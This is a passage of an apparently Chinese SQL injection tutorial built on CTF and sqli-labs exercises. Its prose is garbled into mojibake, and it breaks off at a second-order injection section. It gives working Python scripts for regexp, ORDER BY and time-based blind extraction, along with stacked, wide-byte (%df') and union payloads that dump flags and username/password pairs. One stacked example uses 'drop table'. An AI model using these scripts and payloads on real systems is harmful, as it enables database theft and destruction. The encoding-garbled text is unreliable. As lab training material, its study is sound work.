åŒå¼•å·è¢«è¿‡æ»¤äº† union selectè¢«è¿‡æ»¤äº† = likeä¹Ÿè¢«è¿‡æ»¤äº† è‡³æ­¤æˆ‘ä»¬å¤§éƒ¨åˆ†çš„è¿‡æ»¤æ€è·¯éƒ½è¢«é™åˆ¶äº† æ ¹æ®æ³¨å…¥è¯­å¥è¿™é‡Œæˆ‘ä»¬æƒ³åˆ°å•å¼•å·é€ƒé€¸è¿™ä¸ªæ‰‹æ®µ çœ‹fuzzç»“æœï¼Œæˆ‘ä»¬å‘ç°åæ–œæ æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åæ–œæ å°†å•å¼•å·è½¬ä¹‰ï¼Œè¿™è¦å¯ä»¥å®ç°sqlè¯­å¥çš„é€ƒé€¸ æ ¹æ®è¾“å…¥sqlè¯­å¥ï¼Œå‡è®¾usernameçš„å€¼ä¸ºadmin\\,å¯†ç æ˜¯or 1#ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥çš„ç»“æœå°†ä¼šå¦‚ä¸‹: 1select username,password from user where username='admin\\' and password=' or 1#' è¿™æ ·ç”±äºå•å¼•å·è¢«è½¬ä¹‰ï¼Œ å…¶ä¸­çš„and password=è¿™éƒ¨åˆ†å°±æˆäº†usernameçš„ä¸€éƒ¨åˆ†ï¼Œor 1å°±é€ƒé€¸äº†å‡ºæ¥ ç›´æ¥å°è¯•regexpç›²æ³¨æ–¹å¼ï¼Œæ„é€ payloadä¸ºpassword:or password regexp binary '^A'# è¿™é‡Œçš„binaryå…³é”®å­—æ˜¯ç”¨äºåŒºåˆ†å¤§å°å†™ï¼Œç”±äºç›´æ¥ regexp åŒ¹é…åœ¨ 3.23.4 ç‰ˆæœ¬åæ˜¯ä¸åˆ†å¤§å°å†™ è¿™é‡Œè¿˜ç”±äºè¿‡æ»¤çš„å•å¼•å·ï¼Œæ‰€ä»¥å¯¹å¸¦å…¥çš„åŒ¹é…å­—ç¬¦è¿›è¡Œ16è¿›åˆ¶åŠ å¯† è¿™è¾¹ç›´æ¥ä¸Šè„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/local/env python3# -*- coding:utf-8 -*-import requestsimport stringimport sysstr = [ord(i) for i in string.printable]url = &quot;http://192.168.1.191:2333/index.php&quot;headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close'}# å®šä¹‰å­—ç¬¦ä¸²16è¿›åˆ¶è½¬ç å‡½æ•°def ord2hex(str): result = '' for i in str: result += hex(ord(i)) result = result.replace('0x','') return '0x'+result temp = ''for i in range(50): for j in str: password = ord2hex('^'+ temp + chr(j)) #print(password) payload = 'or password regexp binary {}#' data = { &quot;username&quot;: &quot;admin\\\\&quot;, &quot;password&quot;: payload.format(password) } r = requests.post(url = url, data = data, headers = headers, timeout= 1) if 'BJD need' in r.text: sys.stdout.write(chr(j)) sys.stdout.flush() temp += chr(j) break æ³¨å…¥å‡ºå¯†ç ä¸ºï¼šOhyOuFOuNdit ç™»å½•åç›´æ¥è·å–flag order byç›²æ³¨order by å­å¥ä½œç”¨ï¼šå¯¹æŸ¥è¯¢è¿”å›çš„ç»“æœæŒ‰ä¸€åˆ—æˆ–å¤šåˆ—æ’åºã€‚ è¯­æ³•æ ¼å¼ï¼šORDER BY {column_name [ASC|DASC]}[,...n] æ³¨æ„ï¼šorder by è¯­å¥é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åº åŸºç¡€çŸ¥è¯†12select id,username,password from users order by username,password desc;select id,username,password from users order by username; å¦‚æœæ˜¯æŒ‰ç…§åˆ—ä¸­çš„å­—ç¬¦ä¸²æ¥æ’åºçš„è¯ï¼Œæ˜¯æŒ‰ç…§å­—ç¬¦ä¸²çš„é¦–å­—æ¯ä»¥å…¶åœ¨26å­—æ¯è¡¨ä¸­çš„ä½ç½®æ¥æ’åºçš„ã€‚å¦‚æœorder byçš„åé¢æœ‰å¤šä¸ªå‚æ•°ï¼Œåˆ™ä¼šå…ˆç…§ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ’åºï¼Œå¦‚æœåœ¨æŒ‰ç…§ç¬¬ä¸€ä¸ªå‚æ•°æ’å®Œåºä¹‹åï¼Œå…¶ä¸­æœ‰é‡å¤çš„ï¼Œåˆ™è¿™äº›é‡å¤çš„ä¼šå†æŒ‰ç…§ç¬¬äºŒä¸ªå‚æ•°è¿›è¡Œæ’åº order by ç›²æ³¨æ¦‚å¿µæ ¹æ®ä¸åŒçš„åˆ—æ’åºï¼Œä¼šè¿”å›ä¸åŒçš„ç»“æœï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºboolå‹ç›²æ³¨çš„å½¢å¼æ¥æ³¨å…¥ï¼Œå³ä½¿åˆ¤æ–­ç»“æœä¸æŸç§è¿”å›å†…å®¹ç›¸å…³è”ï¼Œæ¥å®ç°æ³¨å…¥ã€‚(å³ï¼šæ‰€è°“çš„order byç›²æ³¨å°±æ˜¯ä»¥å…¶æ’åºç»“æœä¸ºåŸºå‡†ï¼Œæ¥åˆ¤æ–­æ³¨å…¥è¯­å¥æ˜¯å¦è¢«æˆåŠŸæ‰§è¡Œï¼Œä»è€Œæ¥è¿›è¡Œæš´åŠ›çŒœè§£) order byå¸¸ç”¨ç›²æ³¨è¯­å¥123456select * from user order by id|(if(substr(database(),1,1)='a',1,2));å½“å‰æ•°æ®åº“åç§°çš„é¦–å­—æ¯ä¸ºaæ—¶idå’Œ2â€˜ä¸â€™ï¼Œå¦åˆ™å’Œ3â€˜ä¸â€™ã€‚ ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰select * from user order by id|(if(substr(select flag from CTF),1,1)='a',1,2));è¡¨CTFä¸­flagå­—æ®µçš„é¦–å­—æ¯ä¸ºaæ—¶idå’Œ2â€˜ä¸â€™ï¼Œå¦åˆ™å’Œ3â€˜ä¸â€™ã€‚ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰select * from user order by id|{select (select flag from level1_flag) regexp payload}flagåŒ¹é…æˆåŠŸå’Œ 1 â€œä¸â€ï¼ŒåŒ¹é…å¤±è´¥å’Œ 0 â€œä¸â€ã€‚ ï¼ˆé€ æˆä¸¤ç§ä¸åŒçš„æ’åºï¼‰ sqlilab-less48è¯·æ±‚ä¼ å…¥sortå˜é‡,è¿”å›ç»“æœä¸ºæŸ¥è¯¢çš„æ’åºåˆ—è¡¨;è¾“å…¥ä¸åŒæŸ¥è¯¢sort,è¿”å›ä¸åŒæŸ¥è¯¢æ’åºåˆ—è¡¨; ?sort=id ?sort=username æ„é€ ç›²æ³¨è¯­å¥ï¼Œæ ¹æ®è¿”å›ä¸åŒçš„æ’åºåˆ—ï¼ŒçŒœè§£æ•°æ®ç»“æœå€¼ï¼› ?sort=id|(if((substr(database(),1,1)='s'),1,2))åŒ¹é…è¿”å›æ ‡å‡†æ’åºç»“æœ ?sort=id|(if((substr(database(),1,1)='a'),1,2))ä¸åŒ¹é…è¿”å›å¦å¤–çš„æ’åºç»“æœ æ ¹æ®ä¸Šè¿°æƒ…å†µï¼Œç›´æ¥ç¼–å†™ç›²æ³¨è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829#!/usr/localenv python3# -*- coding:utf-8 -*-import requestsimport sysurl = &quot;http://192.168.1.191:32769/Less-48/?sort=id&quot;headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close'}payloads = { &quot;dbname&quot;: &quot;|(if((ascii(substr(database(),{},1))={}),1,2))&quot;, &quot;tbname&quot;: &quot;|(if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),{},1))={}),1,2))&quot;, &quot;clname&quot;: &quot;|(if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1),{},1))={}),1,2))&quot;, &quot;clname&quot;: &quot;|(if((ascii(substr((select username from users limit 2,1),{},1))={}),1,2))&quot;} for i in range(50): for j in range(48, 128): payload = url + payloads['clname'].format(i, j) #print(payload) content1 = requests.get(url = url, headers = headers, timeout= 1).text content2 = requests.get(url = payload, headers = headers, timeout= 1).text if content1 == content2: sys.stdout.write(chr(j)) sys.stdout.flush() break insert intoæ³¨å…¥è¯­å¥åŸºç¡€INSERT INTO è¯­å¥ç”¨äºå‘è¡¨ä¸­æ’å…¥æ–°è®°å½•ã€‚ è¯­æ³•æ ¼å¼INSERT INTO è¯­å¥å¯ä»¥æœ‰ä¸¤ç§ç¼–å†™å½¢å¼ã€‚ ç¬¬ä¸€ç§å½¢å¼æ— éœ€æŒ‡å®šè¦æ’å…¥æ•°æ®çš„åˆ—åï¼Œåªéœ€æä¾›è¢«æ’å…¥çš„å€¼å³å¯ï¼š 12INSERT INTO table_nameVALUES (value1,value2,value3,...); ç¬¬äºŒç§å½¢å¼éœ€è¦æŒ‡å®šåˆ—ååŠè¢«æ’å…¥çš„å€¼ï¼š 12INSERT INTO table_name (column1,column2,column3,...)VALUES (value1,value2,value3,...); çœŸé¢˜æ¡ˆä¾‹é¢˜ç›®ä¸ºBugkuä¸­çš„ä¸€é“insert intoæ³¨å…¥é¢˜ã€‚ é¢˜ç›®æºç é¢˜ç›®ä¸€å¼€å§‹ç»™å®šäº†æˆ‘ä»¬æºç ï¼Œå¹¶ä¸”hintä¸­æç¤ºï¼šå†™ä¸€ä¸ªpythonè„šæœ¬å§! 1234567891011121314151617181920212223242526272829303132&lt;?php error_reporting(0); function getIp(){ $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){ $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }else{ $ip = $_SERVER['REMOTE_ADDR']; } $ip_arr = explode(',', $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;insert&quot;; $pass=&quot;1234qwer&quot;; $db=&quot;clientip&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo 'your ip is :'.$ip; echo &quot;\\r\\n&quot;; echo &quot;&lt;br&gt;&quot;; $sql=&quot;insert into client_ip (ip) values ('$ip')&quot;; echo $sql; mysql_query($sql);?&gt; é¢˜ç›®åˆ†ææ ¹æ®é¢˜ç›®ç»™å®šçš„æºç å¯ä»¥å‘ç°æ³¨å…¥ç‚¹åœ¨httpå¤´çš„x-forwarded-forå¤„; ä¸”é¢˜ç›®ä¸­è¿‡æ»¤é€—å·ï¼Œé‚£ä¹ˆå¸¸è§„çš„updateå’ŒæŠ¥é”™æ³¨å…¥å’Œifè¯­å¥éƒ½æ²¡æ³•ä½¿ç”¨; è¿™é‡Œå¯ä»¥ä½¿ç”¨select case when xxx then xxx else xxx end;è¯­å¥æ¥ä»£æ›¿ifè¯­å¥çš„ä½¿ç”¨; é¢˜ç›®ä¸­è¿‡æ»¤äº†é€—å·ï¼Œsubstrçš„ä¸­çš„é€—å·ï¼Œå¯ä»¥ä½¿ç”¨from x for xçš„æ–¹å¼æ¥æ›¿æ¢; çŸ¥è¯†å‚¨å¤‡select case xxx when xxx then xxx else xxx end; æ¼æ´åˆ©ç”¨æ³¨å…¥ç‚¹æ˜¯åœ¨httpå¤´çš„x-forwarded-forå¤„; payload:+' and (select case when (length(database())=8) then sleep(5) else 1 end) and '1'='1 å»¶æ—¶5ç§’å“åº” payload:+' and (select case when (length(database())=5) then sleep(5) else 1 end) and '1'='1 æ²¡æœ‰å»¶æ—¶ç›´æ¥å“åº” æ ¹æ®ä¸Šè¯‰è¿”å›æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®é¡µé¢çš„å“åº”çš„æ—¶é—´ä¸é€šè¿‡ï¼Œå¯¹å…¶å†…å®¹è¿›è¡Œé€ä¸€çŒœè§£ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/localenv python3# -*- coding:utf-8 -*-import requestsimport sysURL = &quot;http://192.168.1.191:32771/&quot;PAYLOADS = { &quot;dbname&quot;: &quot;'+(select case when (ascii(substr(database() from {} for 1))&gt;{}) then sleep(3) else 1 end) and '1'='1&quot;, &quot;tbname&quot;: &quot;'+(select case when (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1 offset 1) from {} for 1))&gt;{}) then sleep(3) else 1 end) and '1'='1&quot;, &quot;clname&quot;: &quot;'+(select case when (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='flag' limit 1 offset 0) from {} for 1))&gt;{}) then sleep(3) else 1 end) and '1'='1&quot;, &quot;clcontent&quot;: &quot;'+(select case when (ascii(substr((select flag from flag) from {} for 1))&gt;{}) then sleep(3) else 1 end) and '1'='1&quot;}def get_url_request(url, final_payload): try: result = requests.get(url = url, headers = final_payload, timeout = 5).elapsed.total_seconds() except TimeoutError as e: print(&quot;è¯·æ±‚è¶…æ—¶ã€‚ã€‚ã€‚&quot;) return result# äºŒåˆ†æ³•def merge_serach(url, payload): # å®šä¹‰å¾ªç¯æ•°æ®åˆ—è¡¨ range_list = [x for x in range(0,128)] min = 0 #ä»£è¡¨åˆ—è¡¨ä¸‹æ ‡çš„èµ·å§‹å€¼ max = len(range_list) - 1 #ä»£è¡¨åˆ—è¡¨ä¸‹æ ‡çš„ç»“æŸå€¼ while True: mid = (max + min) // 2 #è·å–åˆ—è¡¨ä¸‹æ ‡çš„ä¸­é—´å€¼ #å®šä¹‰æœ€ç»ˆpayloadæ ¼å¼ headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 F,irefox/52.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Connection': 'close', 'x-forwarded-for': payload.format(mid) } final_payload = headers #print(final_payload['x-forwarded-for']) # åˆ¤æ–­é¡µé¢å“åº”æ—¶é—´è·å–å­—ç¬¦ç»“æœ result = get_url_request(url, final_payload) if result &gt; 2: min = mid else: max = mid if min == max - 1: if result &gt; 2: return max return min+1def main(): for i in range(1, 50): payload = PAYLOADS['clcontent'].format(i, '{}') result = merge_serach(URL, payload) sys.stdout.write(chr(result)) sys.stdout.flush() if __name__ == &quot;__main__&quot;: main() è¿è¡Œç»“æœå¦‚ä¸‹ï¼š å †å æ³¨å…¥å †å æ³¨å…¥åŸç†å †å æ³¨å…¥å’Œuinonè”åˆæ³¨å…¥æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œç”¨æ³•ç±»ä¼¼ï¼Œåªæ˜¯ä¸éœ€è¦å †å æ³¨å…¥ä½¿ç”¨çš„ï¼›ç»“æŸå‰é¢çš„sqlè¯­å¥ï¼š åœ¨ä½¿ç”¨ï¼›(åˆ†å·)ç»“æŸä¸€ä¸ªsqlè¯­å¥åï¼Œå¯ä»¥ç»§ç»­æ„é€ ä¸‹ä¸€æ¡sqlè¯­å¥ï¼› select * from admin;drop table admin;//æ‰§è¡Œè¿™ä¸ªè¯­å¥å…ˆæŸ¥è¯¢adminè¡¨å†…å®¹ï¼Œååˆ é™¤adminè¡¨ï¼› å †å æ³¨å…¥çš„ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š ä½¿ç”¨unionè”åˆæ³¨å…¥æ—¶ï¼Œé¡»ä¿è¯å‰åä¸¤ä¸ªsqlè¯­å¥çš„å¯æ˜¾ç¤ºå­—æ®µæ•°é‡è¦ç›¸åŒï¼Œä½¿ç”¨å †å æ³¨å…¥åˆ™ä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé™åˆ¶ï¼Œå…¶å¯ä»¥æ‰§è¡Œä»»æ„è¯­å¥ï¼› ç¼ºç‚¹ï¼š å †å æ³¨å…¥å¹¶ä¸æ˜¯æ¯ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œæœ‰å¯èƒ½ä¼šå—åˆ°apiæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼› ç›®å‰å·²çŸ¥æ”¯æŒå †å æ³¨å…¥çš„æœ‰ï¼š asp sql server ASP.NET SQL SERVER PHP SQL SERVER MYSQL å †å æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)å¸¦å…¥å•å¼•å·ï¼Œæ•°æ®è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œåˆ¤æ–­å½“å‰å­˜åœ¨æ³¨å…¥ç‚¹ http://192.168.2.220:8080/Less-38/?id=-1' ä½¿ç”¨order byåˆ¤æ–­å­—æ®µä½æ•° å½“å¸¦å…¥çš„å€¼ä¸º3æ—¶ï¼Œé¡µé¢å“åº”æ­£å¸¸ http://192.168.2.220:8080/Less-38/?id=1'order by 3--+ å½“å¸¦å…¥çš„å€¼ä¸º4æ—¶ï¼Œé¡µé¢å“åº”å¼‚å¸¸ï¼Œåˆ¤æ–­åˆ¤æ–­å½“å‰è¡¨ä¸­å­—æ®µé•¿åº¦ä¸º3 http://192.168.2.220:8080/Less-38/?id=1'order by 4--+ ä½¿ç”¨è”åˆæŸ¥è¯¢è·å–æ‰€æœ‰åº“å http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ æ–°å¢åº“åˆ¤æ–­æ˜¯å¦å­˜åœ¨å †å æ³¨å…¥ http://192.168.2.220:8080/Less-38/?id=-1';create database duidietest--+ åˆ©ç”¨æŸ¥åº“é‡æ–°è·å–å½“å‰mysqlçš„æ‰€æœ‰åº“åï¼Œå‘ç°æ–°å¢åº“åæˆåŠŸï¼Œåˆ™åˆ¤æ–­æ˜¯å †å æ³¨å…¥ http://192.168.2.220:8080/Less-38/?id=-1' union select 1,group_concat(schema_name),2 from information_schema.schemata --+ çœŸé¢˜ç¯å¢ƒå¤ç°(å¼ºç½‘æ¯2019-éšä¾¿æ³¨)ç¯å¢ƒå¤ç°cd sql_injection_qw2019_stacked docker-compose up -d é¢˜ç›®åˆ†ææäº¤æ¡†å¸¦å…¥å•å¼•å·ï¼Œè¿”å›æŠ¥é”™è¯­å¥ï¼Œåˆ¤æ–­å­˜åœ¨æ³¨å…¥ï¼› ä½¿ç”¨orderå°è¯•å­—æ®µæ•°é‡çŒœè§£ï¼› 1' order by 2#è¿”å›æ­£å¸¸ 1' order by 3#è¿”å›é”™è¯¯ï¼Œåˆ¤æ–­å­—æ®µæ•°é‡ä¸º2 å°è¯•ä½¿ç”¨union selectè¯­å¥æ³¨å…¥å‡ºåº“å; 1' union select 1,database()# æ ¹æ®è¿”å›ä¿¡æ¯å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œå¸¸ç”¨æ•æ„Ÿå­—ç¬¦å‡è¢«è¿‡æ»¤ï¼›ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤åˆ†å·ï¼Œå°è¯•ä½¿ç”¨å †å æ³¨å…¥è·å–è¡¨å; 1';show tables;# å°è¯•è·å–wordsè¡¨ä¸­çš„å­—æ®µï¼›1';show columns from words;# å°è¯•è·å–1919810931114514è¡¨ä¸­çš„å­—æ®µï¼› 1';show columns from ``1919810931114514``;#æ³¨ï¼šè‹¥è¡¨åä¸ºçº¯æ•°å­—æ—¶ï¼ŒæŸ¥è¯¢å­—æ®µéœ€è¦å°†è¡¨åç”¨åå¼•å·åŒ…è£¹èµ·æ¥ ç›®å‰å·²ç»è·å–åˆ°äº†è¡¨ä¸­flagçš„å­—æ®µåï¼Œæ€ä¹ˆè·å–å­—æ®µå†…å®¹æ˜¯å…³é”®ç‚¹ï¼› è§£æ³•ä¸€ï¼šä½¿ç”¨renameæŠŠwordsè¡¨æ›´åä¸ºå…¶ä»–çš„è¡¨åï¼›åœ¨æŠŠè¡¨1919810931114514æ”¹æˆwords;ç»™æ–°wordsè¡¨æ·»åŠ æ–°çš„åˆ—åid;å°†flagæ”¹åä¸ºdata; payload1: 10';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# payload12: 11' or 1=1# è§£æ³•äºŒï¼š 123å°†select * from ` 1919810931114514 `è¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼›åœ¨æ„é€ payloadï¼š1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚ executeç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚ SELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚ è§£æ³•ä¸‰ï¼š payload: 11'; handler `1919810931114514` open as `a`; handler `a` read next;# å®½å­—èŠ‚æ³¨å…¥å®½å­—èŠ‚æ³¨å…¥çš„æ¦‚å¿µâ€¢ å®½å­—èŠ‚æ˜¯ç›¸å¯¹äºasciiè¿™æ ·çš„å•å­—èŠ‚è€Œè¨€çš„ï¼›åƒGB2312ã€GBKã€GB18030ã€BIG5ã€Shift_IISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤ä¸ªå­—èŠ‚ â€¢ GBKæ˜¯ä¸€ç§å¤šå­—ç¬¦ç¼–ç ï¼Œé€šå¸¸æ¥è¯´ï¼Œä¸€ä¸ªgbkç¼–ç æ±‰å­—ã€å ç”¨2ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ªutf-8ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚ å®½å­—èŠ‚æ³¨å…¥çš„åŸç†GBK å ç”¨ä¸¤å­—èŠ‚ï¼ŒASCIIå ç”¨ä¸€å­—èŠ‚ PHPä¸­ç¼–ç ä¸ºGBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ASCIIç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€œ\\â€ï¼‰ï¼ŒMYSQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚ å¤§å®¶éƒ½çŸ¥é“%df'è¢«PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ \\ï¼Œå˜æˆäº† %df\\'ï¼Œå…¶ä¸­\\çš„åå…­è¿›åˆ¶æ˜¯ %5C ï¼Œé‚£ä¹ˆç°åœ¨ %df\\â€™ =%df%5c%27ï¼Œå¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼Œåˆ™MySQLç”¨GBKçš„ç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º%df%5c æ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç¸—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\\â€™ = %df%5c%27=ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¥½æ³¨å…¥äº†ã€‚ å®½å­—èŠ‚æ³¨å…¥å‰ææ¡ä»¶ç®€å•ç†è§£: æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ æ·±å…¥è®²è§£ï¼š è¦æœ‰å®½å­—èŠ‚æ³¨å…¥æ¼æ´ï¼Œé¦–å…ˆè¦æ»¡è¶³æ•°æ®åº“åç«¯ä½¿ç”¨åŒ/å¤šå­—èŠ‚è§£æSQLè¯­å¥ï¼Œå…¶æ¬¡è¿˜è¦ä¿è¯åœ¨è¯¥ç§å­—ç¬¦é›†èŒƒå›´ä¸­åŒ…å«ä½å­—èŠ‚ä½æ˜¯ 0x5C(01011100) çš„å­—ç¬¦ï¼Œåˆæ­¥çš„æµ‹è¯•ç»“æœ Big5 å’Œ GBK å­—ç¬¦é›†éƒ½æ˜¯æœ‰çš„ï¼Œ UTF-8 å’Œ GB2312 æ²¡æœ‰è¿™ç§å­—ç¬¦ï¼ˆä¹Ÿå°±ä¸å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ï¼‰ã€‚ å®½å­—èŠ‚æ³¨å…¥çš„åˆ©ç”¨(sqlilab-less38)æµ‹è¯•é¡µé¢å­˜åœ¨æ³¨å…¥ç‚¹ é¦–å…ˆæˆ‘ä»¬ç”¨å¸¸è§„æµ‹è¯•æ–¹æ³•å¸¦å…¥å•å¼•å·ï¼Œåˆ¤æ–­å½“å‰é¡µé¢æ˜¯å¦å­˜åœ¨æ³¨å…¥ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š é€šè¿‡å›¾ç‰‡æˆ‘ä»¬å‘ç°å½“å‰é¡µé¢æ•°æ®å›æ˜¾ç»“æœæ˜¯æ­£å¸¸çš„ï¼Œä¸‹é¢æç¤ºä¿¡æ¯æˆ‘ä»¬çœ‹åˆ°ï¼ŒåŸæ¥æˆ‘ä»¬å¸¦å…¥çš„å•å¼•å·è¢«å¢åŠ ä¸€åæ–œæ è½¬ä¹‰äº†ï¼Œæ‰€ä»¥å¯¼è‡´æˆ‘ä»¬çš„å•å¼•å·å¸¦å…¥å¤±æ•ˆã€‚è¿™è¾¹æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°æºç ä¸­å¯èƒ½ç”¨äº†addslasheså‡½æ•°ç­‰æˆ‘ä»¬å¸¦å…¥çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚ æŸ¥çœ‹æºç  1234567891011121314151617181920212223function check_addslashes($string){ $string = addslashes($string); return $string;}// take the variables if(isset($_GET['id'])){$id=check_addslashes($_GET['id']);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'ID:'.$id.&quot;\\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); é€šè¿‡æºç æˆ‘ä»¬çœ‹åˆ°mysqlè®¾ç½®äº†gbkçš„ç¼–ç æ–¹å¼ï¼Œè¿™è¾¹æˆ‘ä»¬æƒ³åˆ°å®½å­—èŠ‚æ³¨å…¥ã€‚ http://192.168.31.220:8080/Less-32/?id=1%df' æˆ‘ä»¬å‘ç°æ­¤æ—¶é¡µé¢æŠ¥é”™ï¼Œè¿™æ˜¯phpä½¿ç”¨addslasheså‡½æ•°å°†%df'ä¸­çš„å•å¼•å·è½¬ä¹‰ï¼Œå½¢æˆ%df\\'ã€‚mysqlçš„gbkç¼–ç æŠŠ%df\\è®¤ä¸ºæ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œæ­¤æ—¶å•å¼•å·å°±æˆåŠŸé€ƒé€¸å‡ºæ¥ï¼Œäº§ç”Ÿäº†æ³¨å…¥ã€‚åé¢ä½¿ç”¨å¸¸è§çš„è”åˆæ³¨å…¥å³å¯ã€‚ çŒœè§£æ•°æ®å é¦–å…ˆä½¿ç”¨order byå‡½æ•°åˆ¤æ–­å½“å‰åº“çš„å­—æ®µæ•°é‡ http://192.168.31.220:8080/Less-32/?id=-1%df' order by 4--+ å¸¦å…¥å‚æ•°4æ—¶ï¼Œæ•°æ®åº“æŠ¥é”™ã€‚åˆ¤æ–­å½“å‰å­—æ®µæ•°é‡ä¸º4 http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,database(),3--+ è·å–åˆ°å½“å‰æ•°æ®åº“çš„åç§°ä¸ºsecurity çŒœè§£åº“ä¸­çš„è¡¨å http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ è·å–å½“å‰åº“ä¸‹çš„è¡¨åä¸ºemails,referers,uagents,users çŒœè§£usersè¡¨ä¸­çš„å­—æ®µå http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x27736563757269747927 and table_name=0x27757365727327--+ è·å–å­—æ®µå†…å®¹ http://192.168.31.220:8080/Less-32/?id=-1%df' union select 1,group_concat(username,password),3 from users--+ äºŒæ¬¡æ³¨å…¥æ³¨å…¥å’ŒäºŒæ¬¡æ³¨å…¥çš„åŒºåˆ«sqlæ³¨å…¥æµç¨‹ï¼š â€¢ 1.æ”»å‡»è€…åœ¨æ³¨å…¥ç‚¹è¾“å…¥æ¶æ„sqlè¯­å¥ï¼Œé€šè¿‡httpè¯·æ±‚æäº¤ï¼› â€¢ 